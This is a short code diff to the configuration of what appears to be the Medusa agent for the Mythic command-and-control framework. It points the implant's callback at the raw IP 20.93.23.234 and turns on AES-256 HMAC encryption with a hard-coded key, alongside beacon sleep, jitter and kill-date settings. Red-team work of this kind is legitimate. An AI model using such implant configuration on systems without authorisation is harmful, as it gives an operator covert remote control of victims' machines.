@@ -38,7 +38,7 @@ class medusa:
         self.current_directory = os.getcwd()
         # configure on Mythic
         self.agent_config = {
-            "Server": "http://onlineshop.com",
+            "Server": "http://20.93.23.234",
             "Port": "80",
             "PostURI": "/data",
             "PayloadUUID": "89fe22f1-1cfe-4b65-af5e-76cf4497a9fd",
@@ -47,8 +47,12 @@ class medusa:
             "Sleep": 10,
             "Jitter": 23,
             "KillDate": "2025-09-13",
-            "enc_key": {"dec_key": None, "enc_key": None, "value": "none"},
-            # "enc_key": {"dec_key": None, "enc_key": None, "value": "aes256_hmac"},
+            # "enc_key": {"dec_key": None, "enc_key": None, "value": "none"},
+            "enc_key": {
+                "dec_key": "4QZ8xRnEtWkg2LogHKKl8OdZI8IKA7N8ElD3D072uws=", 
+                "enc_key": "4QZ8xRnEtWkg2LogHKKl8OdZI8IKA7N8ElD3D072uws=", 
+                "value": "aes256_hmac"
+                },
             "ExchChk": "False",
             "GetURI": "/index",
             "GetParam": "q",
